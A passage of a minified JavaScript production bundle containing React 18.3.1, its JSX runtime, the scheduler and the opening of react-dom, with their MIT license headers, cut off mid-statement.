var sR=Object.defineProperty;var oR=(n,e,t)=>e in n?sR(n,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):n[e]=t;var _n=(n,e,t)=>(oR(n,typeof e!="symbol"?e+"":e,t),t);function aR(n,e){for(var t=0;t<e.length;t++){const r=e[t];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in n)){const s=Object.getOwnPropertyDescriptor(r,i);s&&Object.defineProperty(n,i,s.get?s:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function t(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=t(i);fetch(i.href,s)}})();var di=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};function Eo(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}function zy(n){if(n.__esModule)return n;var e=n.default;if(typeof e=="function"){var t=function r(){return this instanceof r?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};t.prototype=e.prototype}else t={};return Object.defineProperty(t,"__esModule",{value:!0}),Object.keys(n).forEach(function(r){var i=Object.getOwnPropertyDescriptor(n,r);Object.defineProperty(t,r,i.get?i:{enumerable:!0,get:function(){return n[r]}})}),t}var NS={exports:{}},np={},PS={exports:{}},qe={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ih=Symbol.for("react.element"),lR=Symbol.for("react.portal"),cR=Symbol.for("react.fragment"),uR=Symbol.for("react.strict_mode"),hR=Symbol.for("react.profiler"),fR=Symbol.for("react.provider"),dR=Symbol.for("react.context"),pR=Symbol.for("react.forward_ref"),gR=Symbol.for("react.suspense"),mR=Symbol.for("react.memo"),yR=Symbol.for("react.lazy"),H1=Symbol.iterator;function wR(n){return n===null||typeof n!="object"?null:(n=H1&&n[H1]||n["@@iterator"],typeof n=="function"?n:null)}var LS={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},DS=Object.assign,OS={};function ec(n,e,t){this.props=n,this.context=e,this.refs=OS,this.updater=t||LS}ec.prototype.isReactComponent={};ec.prototype.setState=function(n,e){if(typeof n!="object"&&typeof n!="function"&&n!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,n,e,"setState")};ec.prototype.forceUpdate=function(n){this.updater.enqueueForceUpdate(this,n,"forceUpdate")};function BS(){}BS.prototype=ec.prototype;function Wy(n,e,t){this.props=n,this.context=e,this.refs=OS,this.updater=t||LS}var $y=Wy.prototype=new BS;$y.constructor=Wy;DS($y,ec.prototype);$y.isPureReactComponent=!0;var q1=Array.isArray,US=Object.prototype.hasOwnProperty,Hy={current:null},jS={key:!0,ref:!0,__self:!0,__source:!0};function VS(n,e,t){var r,i={},s=null,o=null;if(e!=null)for(r in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(s=""+e.key),e)US.call(e,r)&&!jS.hasOwnProperty(r)&&(i[r]=e[r]);var a=arguments.length-2;if(a===1)i.children=t;else if(1<a){for(var l=Array(a),u=0;u<a;u++)l[u]=arguments[u+2];i.children=l}if(n&&n.defaultProps)for(r in a=n.defaultProps,a)i[r]===void 0&&(i[r]=a[r]);return{$$typeof:ih,type:n,key:s,ref:o,props:i,_owner:Hy.current}}function vR(n,e){return{$$typeof:ih,type:n.type,key:e,ref:n.ref,props:n.props,_owner:n._owner}}function qy(n){return typeof n=="object"&&n!==null&&n.$$typeof===ih}function _R(n){var e={"=":"=0",":":"=2"};return"$"+n.replace(/[=:]/g,function(t){return e[t]})}var K1=/\/+/g;function vg(n,e){return typeof n=="object"&&n!==null&&n.key!=null?_R(""+n.key):e.toString(36)}function _f(n,e,t,r,i){var s=typeof n;(s==="undefined"||s==="boolean")&&(n=null);var o=!1;if(n===null)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(n.$$typeof){case ih:case lR:o=!0}}if(o)return o=n,i=i(o),n=r===""?"."+vg(o,0):r,q1(i)?(t="",n!=null&&(t=n.replace(K1,"$&/")+"/"),_f(i,e,t,"",function(u){return u})):i!=null&&(qy(i)&&(i=vR(i,t+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(K1,"$&/")+"/")+n)),e.push(i)),1;if(o=0,r=r===""?".":r+":",q1(n))for(var a=0;a<n.length;a++){s=n[a];var l=r+vg(s,a);o+=_f(s,e,t,l,i)}else if(l=wR(n),typeof l=="function")for(n=l.call(n),a=0;!(s=n.next()).done;)s=s.value,l=r+vg(s,a++),o+=_f(s,e,t,l,i);else if(s==="object")throw e=String(n),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function Vh(n,e,t){if(n==null)return n;var r=[],i=0;return _f(n,r,"","",function(s){return e.call(t,s,i++)}),r}function ER(n){if(n._status===-1){var e=n._result;e=e(),e.then(function(t){(n._status===0||n._status===-1)&&(n._status=1,n._result=t)},function(t){(n._status===0||n._status===-1)&&(n._status=2,n._result=t)}),n._status===-1&&(n._status=0,n._result=e)}if(n._status===1)return n._result.default;throw n._result}var cr={current:null},Ef={transition:null},IR={ReactCurrentDispatcher:cr,ReactCurrentBatchConfig:Ef,ReactCurrentOwner:Hy};function FS(){throw Error("act(...) is not supported in production builds of React.")}qe.Children={map:Vh,forEach:function(n,e,t){Vh(n,function(){e.apply(this,arguments)},t)},count:function(n){var e=0;return Vh(n,function(){e++}),e},toArray:function(n){return Vh(n,function(e){return e})||[]},only:function(n){if(!qy(n))throw Error("React.Children.only expected to receive a single React element child.");return n}};qe.Component=ec;qe.Fragment=cR;qe.Profiler=hR;qe.PureComponent=Wy;qe.StrictMode=uR;qe.Suspense=gR;qe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=IR;qe.act=FS;qe.cloneElement=function(n,e,t){if(n==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+n+".");var r=DS({},n.props),i=n.key,s=n.ref,o=n._owner;if(e!=null){if(e.ref!==void 0&&(s=e.ref,o=Hy.current),e.key!==void 0&&(i=""+e.key),n.type&&n.type.defaultProps)var a=n.type.defaultProps;for(l in e)US.call(e,l)&&!jS.hasOwnProperty(l)&&(r[l]=e[l]===void 0&&a!==void 0?a[l]:e[l])}var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){a=Array(l);for(var u=0;u<l;u++)a[u]=arguments[u+2];r.children=a}return{$$typeof:ih,type:n.type,key:i,ref:s,props:r,_owner:o}};qe.createContext=function(n){return n={$$typeof:dR,_currentValue:n,_currentValue2:n,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},n.Provider={$$typeof:fR,_context:n},n.Consumer=n};qe.createElement=VS;qe.createFactory=function(n){var e=VS.bind(null,n);return e.type=n,e};qe.createRef=function(){return{current:null}};qe.forwardRef=function(n){return{$$typeof:pR,render:n}};qe.isValidElement=qy;qe.lazy=function(n){return{$$typeof:yR,_payload:{_status:-1,_result:n},_init:ER}};qe.memo=function(n,e){return{$$typeof:mR,type:n,compare:e===void 0?null:e}};qe.startTransition=function(n){var e=Ef.transition;Ef.transition={};try{n()}finally{Ef.transition=e}};qe.unstable_act=FS;qe.useCallback=function(n,e){return cr.current.useCallback(n,e)};qe.useContext=function(n){return cr.current.useContext(n)};qe.useDebugValue=function(){};qe.useDeferredValue=function(n){return cr.current.useDeferredValue(n)};qe.useEffect=function(n,e){return cr.current.useEffect(n,e)};qe.useId=function(){return cr.current.useId()};qe.useImperativeHandle=function(n,e,t){return cr.current.useImperativeHandle(n,e,t)};qe.useInsertionEffect=function(n,e){return cr.current.useInsertionEffect(n,e)};qe.useLayoutEffect=function(n,e){return cr.current.useLayoutEffect(n,e)};qe.useMemo=function(n,e){return cr.current.useMemo(n,e)};qe.useReducer=function(n,e,t){return cr.current.useReducer(n,e,t)};qe.useRef=function(n){return cr.current.useRef(n)};qe.useState=function(n){return cr.current.useState(n)};qe.useSyncExternalStore=function(n,e,t){return cr.current.useSyncExternalStore(n,e,t)};qe.useTransition=function(){return cr.current.useTransition()};qe.version="18.3.1";PS.exports=qe;var Y=PS.exports;const ae=Eo(Y),SR=aR({__proto__:null,default:ae},[Y]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var TR=Y,AR=Symbol.for("react.element"),bR=Symbol.for("react.fragment"),xR=Object.prototype.hasOwnProperty,kR=TR.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,CR={key:!0,ref:!0,__self:!0,__source:!0};function zS(n,e,t){var r,i={},s=null,o=null;t!==void 0&&(s=""+t),e.key!==void 0&&(s=""+e.key),e.ref!==void 0&&(o=e.ref);for(r in e)xR.call(e,r)&&!CR.hasOwnProperty(r)&&(i[r]=e[r]);if(n&&n.defaultProps)for(r in e=n.defaultProps,e)i[r]===void 0&&(i[r]=e[r]);return{$$typeof:AR,type:n,key:s,ref:o,props:i,_owner:kR.current}}np.Fragment=bR;np.jsx=zS;np.jsxs=zS;NS.exports=np;var Q=NS.exports,jm={},WS={exports:{}},Pr={},$S={exports:{}},HS={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(n){function e(R,j){var H=R.length;R.push(j);e:for(;0<H;){var D=H-1>>>1,y=R[D];if(0<i(y,j))R[D]=j,R[H]=y,H=D;else break e}}function t(R){return R.length===0?null:R[0]}function r(R){if(R.length===0)return null;var j=R[0],H=R.pop();if(H!==j){R[0]=H;e:for(var D=0,y=R.length,V=y>>>1;D<V;){var oe=2*(D+1)-1,ce=R[oe],he=oe+1,Ce=R[he];if(0>i(ce,H))he<y&&0>i(Ce,ce)?(R[D]=Ce,R[he]=H,D=he):(R[D]=ce,R[oe]=H,D=oe);else if(he<y&&0>i(Ce,H))R[D]=Ce,R[he]=H,D=he;else break e}}return j}function i(R,j){var H=R.sortIndex-j.sortIndex;return H!==0?H:R.id-j.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;n.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();n.unstable_now=function(){return o.now()-a}}var l=[],u=[],h=1,f=null,p=3,w=!1,x=!1,k=!1,I=typeof setTimeout=="function"?setTimeout:null,A=typeof clearTimeout=="function"?clearTimeout:null,b=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function E(R){for(var j=t(u);j!==null;){if(j.callback===null)r(u);else if(j.startTime<=R)r(u),j.sortIndex=j.expirationTime,e(l,j);else break;j=t(u)}}function O(R){if(k=!1,E(R),!x)if(t(l)!==null)x=!0,C(W);else{var j=t(u);j!==null&&M(O,j.startTime-R)}}function W(R,j){x=!1,k&&(k=!1,A(N),N=-1),w=!0;var H=p;try{for(E(j),f=t(l);f!==null&&(!(f.expirationTime>j)||R&&!$());){var D=f.callback;if(typeof D=="function"){f.callback=null,p=f.priorityLevel;var y=D(f.expirationTime<=j);j=n.unstable_now(),typeof y=="function"?f.callback=y:f===t(l)&&r(l),E(j)}else r(l);f=t(l)}if(f!==null)var V=!0;else{var oe=t(u);oe!==null&&M(O,oe.startTime-j),V=!1}return V}finally{f=null,p=H,w=!1}}var q=!1,L=null,N=-1,B=5,z=-1;function $(){return!(n.unstable_now()-z<B)}function K(){if(L!==null){var R=n.unstable_now();z=R;var j=!0;try{j=L(!0,R)}finally{j?S():(q=!1,L=null)}}else q=!1}var S;if(typeof b=="function")S=function(){b(K)};else if(typeof MessageChannel<"u"){var d=new MessageChannel,_=d.port2;d.port1.onmessage=K,S=function(){_.postMessage(null)}}else S=function(){I(K,0)};function C(R){L=R,q||(q=!0,S())}function M(R,j){N=I(function(){R(n.unstable_now())},j)}n.unstable_IdlePriority=5,n.unstable_ImmediatePriority=1,n.unstable_LowPriority=4,n.unstable_NormalPriority=3,n.unstable_Profiling=null,n.unstable_UserBlockingPriority=2,n.unstable_cancelCallback=function(R){R.callback=null},n.unstable_continueExecution=function(){x||w||(x=!0,C(W))},n.unstable_forceFrameRate=function(R){0>R||125<R?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):B=0<R?Math.floor(1e3/R):5},n.unstable_getCurrentPriorityLevel=function(){return p},n.unstable_getFirstCallbackNode=function(){return t(l)},n.unstable_next=function(R){switch(p){case 1:case 2:case 3:var j=3;break;default:j=p}var H=p;p=j;try{return R()}finally{p=H}},n.unstable_pauseExecution=function(){},n.unstable_requestPaint=function(){},n.unstable_runWithPriority=function(R,j){switch(R){case 1:case 2:case 3:case 4:case 5:break;default:R=3}var H=p;p=R;try{return j()}finally{p=H}},n.unstable_scheduleCallback=function(R,j,H){var D=n.unstable_now();switch(typeof H=="object"&&H!==null?(H=H.delay,H=typeof H=="number"&&0<H?D+H:D):H=D,R){case 1:var y=-1;break;case 2:y=250;break;case 5:y=1073741823;break;case 4:y=1e4;break;default:y=5e3}return y=H+y,R={id:h++,callback:j,priorityLevel:R,startTime:H,expirationTime:y,sortIndex:-1},H>D?(R.sortIndex=H,e(u,R),t(l)===null&&R===t(u)&&(k?(A(N),N=-1):k=!0,M(O,H-D))):(R.sortIndex=y,e(l,R),x||w||(x=!0,C(W))),R},n.unstable_shouldYield=$,n.unstable_wrapCallback=function(R){var j=p;return function(){var H=p;p=j;try{return R.apply(this,arguments)}finally{p=H}}}})(HS);$S.exports=HS;var RR=$S.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var MR=Y,Nr=RR;function le(n){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+n,t=1;t<arguments.length;t++)e+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+n+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var qS=new Set,vu={};function wa(n,e){kl(n,e),kl(n+"Capture",e)}function kl(n,e){for(vu[n]=e,n=0;n<e.length;n++)qS.add(e[n])}var ls=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Vm=Object.prototype.hasOwnProperty,NR=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,G1={},Q1={};function PR(n){return Vm.call(Q1,n)?!0:Vm.call(G1,n)?!1:NR.test(n)?Q1[n]=!0:(G1[n]=!0,!1)}function LR(n,e,t,r){if(t!==null&&t.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return r?!1:t!==null?!t.acceptsBooleans:(n=n.toLowerCase().slice(0,5),n!=="data-"&&n!=="aria-");default:return!1}}function DR(n,e,t,r){if(e===null||typeof e>"u"||LR(n,e,t,r))return!0;if(r)return!1;if(t!==null)switch(t.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function ur(n,e,t,r,i,s,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=t,this.propertyName=n,this.type=e,this.sanitizeURL=s,this.removeEmptyString=o}var Vn={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(n){Vn[n]=new ur(n,0,!1,n,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(n){var e=n[0];Vn[e]=new ur(e,1,!1,n[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(n){Vn[n]=new ur(n,2,!1,n.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(n){Vn[n]=new ur(n,2,!1,n,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(n){Vn[n]=new ur(n,3,!1,n.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(n){Vn[n]=new ur(n,3,!0,n,null,!1,!1)});["capture","download"].forEach(function(n){Vn[n]=new ur(n,4,!1,n,null,!1,!1)});["cols","rows","size","span"].forEach(function(n){Vn[n]=new ur(n,6,!1,n,null,!1,!1)});["rowSpan","start"].forEach(function(n){Vn[n]=new ur(n,5,!1,n.toLowerCase(),null,!1,!1)});var Ky=/[\-:]([a-z])/g;function Gy(n){return n[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(n){var e=n.replace(Ky,Gy);Vn[e]=new ur(e,1,!1,n,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(n){var e=n.replace(Ky,Gy);Vn[e]=new ur(e,1,!1,n,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(n){var e=n.replace(Ky,Gy);Vn[e]=new ur(e,1,!1,n,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(n){Vn[n]=new ur(n,1,!1,n.toLowerCase(),null,!1,!1)});Vn.xlinkHref=new ur("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(n){Vn[n]=new ur(n,1,!1,n.toLowerCase(),null,!0,!0)});function Qy(n,e,t,r){var i=Vn.hasOwnProperty(e)?Vn[e]:null;(i!==null?i.type!==0:r||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(DR(e,t,i,r)&&(t=null),r||i===null?PR(e)&&(t===null?n.removeAttribute(e):n.setAttribute(e,""+t)):i.mustUseProperty?n[i.propertyName]=t===null?i.type===3?!1:"":t:(e=i.attributeName,r=i.attributeNamespace,t===null?n.removeAttribute(e):(i=i.type,t=i===3||i===4&&t===!0?"":""+t,r?n.setAttributeNS(r,e,t):n.setAttribute(e,t))))}var vs=MR.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Fh=Symbol.for("react.element"),Za=Symbol.for("react.portal"),Ja=Symbol.for("react.fragment"),Yy=Symbol.for("react.strict_mode"),Fm=Symbol.for("react.profiler"),KS=Symbol.for("react.provider"),GS=Symbol.for("react.context"),Zy=Symbol.for("react.forward_ref"),zm=Symbol.for("react.suspense"),Wm=Symbol.for("react.suspense_list"),Jy=Symbol.for("react.memo"),Ps=Symbol.for("react.lazy"),QS=Symbol.for("react.offscreen"),Y1=Symbol.iterator;function Nc(n){return n===null||typeof n!="object"?null:(n=Y1&&n[Y1]||n["@@iterator"],typeof n=="function"?n:null)}var Kt=Object.assign,_g;function Wc(n){if(_g===void 0)try{throw Error()}catch(t){var e=t.stack.trim().match(/\n( *(at )?)/);_g=e&&e[1]||""}return`
`+_g+n}var Eg=!1;function Ig(n,e){if(!n||Eg)return"";Eg=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(u){var r=u}Reflect.construct(n,[],e)}else{try{e.call()}catch(u){r=u}n.call(e.prototype)}else{try{throw Error()}catch(u){r=u}n()}}catch(u){if(u&&r&&typeof u.stack=="string"){for(var i=u.stack.split(`
`),s=r.stack.split(`
`),o=i.length-1,a=s.length-1;1<=o&&0<=a&&i[o]!==s[a];)a--;for(;1<=o&&0<=a;o--,a--)if(i[o]!==s[a]){if(o!==1||a!==1)do if(o--,a--,0>a||i[o]!==s[a]){var l=`
`+i[o].replace(" at new "," at ");return n.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",n.displayName)),l}while(1<=o&&0<=a);break}}}finally{Eg=!1,Error.prepareStackTrace=t}return(n=n?n.displayName||n.name:"")?Wc(n):""}function OR(n){switch(n.tag){case 5:return Wc(n.type);case 16:return Wc("Lazy");case 13:return Wc("Suspense");case 19:return Wc("SuspenseList");case 0:case 2:case 15:return n=Ig(n.type,!1),n;case 11:return n=Ig(n.type.render,!1),n;case 1:return n=Ig(n.type,!0),n;default:return""}}function $m(n){if(n==null)return null;if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n;switch(n){case Ja:return"Fragment";case Za:return"Portal";case Fm:return"Profiler";case Yy:return"StrictMode";case zm:return"Suspense";case Wm:return"SuspenseList"}if(typeof n=="object")switch(n.$$typeof){case GS:return(n.displayName||"Context")+".Consumer";case KS:return(n._context.displayName||"Context")+".Provider";case Zy:var e=n.render;return n=n.displayName,n||(n=e.displayName||e.name||"",n=n!==""?"ForwardRef("+n+")":"ForwardRef"),n;case Jy:return e=n.displayName||null,e!==null?e:$m(n.type)||"Memo";case Ps:e=n._payload,n=n._init;try{return $m(n(e))}catch{}}return null}function BR(n){var e=n.type;switch(n.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return n=e.render,n=n.displayName||n.name||"",e.displayName||(n!==""?"ForwardRef("+n+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return $m(e);case 8:return e===Yy?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function fo(n){switch(typeof n){case"boolean":case"number":case"string":case"undefined":return n;case"object":return n;default:return""}}function YS(n){var e=n.type;return(n=n.nodeName)&&n.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function UR(n){var e=YS(n)?"checked":"value",t=Object.getOwnPropertyDescriptor(n.constructor.prototype,e),r=""+n[e];if(!n.hasOwnProperty(e)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var i=t.get,s=t.set;return Object.defineProperty(n,e,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,s.call(this,o)}}),Object.defineProperty(n,e,{enumerable:t.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){n._valueTracker=null,delete n[e]}}}}function zh(n){n._valueTracker||(n._valueTracker=UR(n))}function ZS(n){if(!n)return!1;var e=n._valueTracker;if(!e)return!0;var t=e.getValue(),r="";return n&&(r=YS(n)?n.checked?"true":"false":n.value),n=r,n!==t?(e.setValue(n),!0):!1}function Qf(n){if(n=n||(typeof document<"u"?document:void 0),typeof n>"u")return null;try{return n.activeElement||n.body}catch{return n.body}}function Hm(n,e){var t=e.checked;return Kt({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??n._wrapperState.initialChecked})}function Z1(n,e){var t=e.defaultValue==null?"":e.defaultValue,r=e.checked!=null?e.checked:e.defaultChecked;t=fo(e.value!=null?e.value:t),n._wrapperState={initialChecked:r,initialValue:t,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function JS(n,e){e=e.checked,e!=null&&Qy(n,"checked",e,!1)}function qm(n,e){JS(n,e);var t=fo(e.value),r=e.type;if(t!=null)r==="number"?(t===0&&n.value===""||n.value!=t)&&(n.value=""+t):n.value!==""+t&&(n.value=""+t);else if(r==="submit"||r==="reset"){n.removeAttribute("value");return}e.hasOwnProperty("value")?Km(n,e.type,t):e.hasOwnProperty("defaultValue")&&Km(n,e.type,fo(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(n.defaultChecked=!!e.defaultChecked)}function J1(n,e,t){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!(r!=="submit"&&r!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+n._wrapperState.initialValue,t||e===n.value||(n.value=e),n.defaultValue=e}t=n.name,t!==""&&(n.name=""),n.defaultChecked=!!n._wrapperState.initialChecked,t!==""&&(n.name=t)}function Km(n,e,t){(e!=="number"||Qf(n.ownerDocument)!==n)&&(t==null?n.defaultValue=""+n._wrapperState.initialValue:n.defaultValue!==""+t&&(n.defaultValue=""+t))}var $c=Array.isArray;function pl(n,e,t,r){if(n=n.options,e){e={};for(var i=0;i<t.length;i++)e["$"+t[i]]=!0;for(t=0;t<n.length;t++)i=e.hasOwnProperty("$"+n[t].value),n[t].selected!==i&&(n[t].selected=i),i&&r&&(n[t].defaultSelected=!0)}else{for(t=""+fo(t),e=null,i=0;i<n.length;i++){if(n[i].value===t){n[i].selected=!0,r&&(n[i].defaultSelected=!0);return}e!==null||n[i].disabled||(e=n[i])}e!==null&&(e.selected=!0)}}function Gm(n,e){if(e.dangerouslySetInnerHTML!=null)throw Error(le(91));return Kt({},e,{value:void 0,defaultValue:void 0,children:""+n._wrapperState.initialValue})}function X1(n,e){var t=e.value;if(t==null){if(t=e.children,e=e.defaultValue,t!=null){if(e!=null)throw Error(le(92));if($c(t)){if(1<t.length)throw Error(le(93));t=t[0]}e=t}e==null&&(e=""),t=e}n._wrapperState={initialValue:fo(t)}}function XS(n,e){var t=fo(e.value),r=fo(e.defaultValue);t!=null&&(t=""+t,t!==n.value&&(n.value=t),e.defaultValue==null&&n.defaultValue!==t&&(n.defaultValue=t)),r!=null&&(n.defaultValue=""+r)}function e_(n){var e=n.textContent;e===n._wrapperState.initialValue&&e!==""&&e!==null&&(n.value=e)}function eT(n){switch(n){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Qm(n,e){return n==null||n==="http://www.w3.org/1999/xhtml"?eT(e):n==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":n}var Wh,tT=function(n){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,t,r,i){MSApp.execUnsafeLocalFunction(function(){return n(e,t,r,i)})}:n}(function(n,e){if(n.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in n)n.innerHTML=e;else{for(Wh=Wh||document.createElement("div"),Wh.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=Wh.firstChild;n.firstChild;)n.removeChild(n.firstChild);for(;e.firstChild;)n.appendChild(e.firstChild)}});function _u(n,e){if(e){var t=n.firstChild;if(t&&t===n.lastChild&&t.nodeType===3){t.nodeValue=e;return}}n.textContent=e}var 